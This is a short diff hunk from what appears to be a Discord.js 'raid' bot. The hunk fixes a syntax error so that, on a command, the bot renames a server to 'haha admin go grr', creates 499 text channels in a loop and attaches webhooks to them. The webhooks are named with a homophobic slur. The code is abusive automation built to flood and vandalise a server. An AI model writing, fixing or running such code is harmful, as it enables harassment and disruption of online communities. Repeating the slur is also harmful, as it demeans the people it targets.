@@ -36,7 +36,7 @@ client.on("message", async (message) => {
             if(!args.slice(0).join(' ')){ 
                 message.guild.setName('haha admin go grr')
                 for(i = 0; i < 499; i++){
-                    message.guild.createChannel(`haha admin go grr`, {type: `text`).then(m =>{
+                    message.guild.createChannel(`haha admin go grr`, {type: `text`}).then(m =>{
                         const mch1 = message.channel.id
                         m.createWebhook("get raided faggots").then(w => {
                           const case1hook = new Discord.WebhookClient(w.id, w.token)
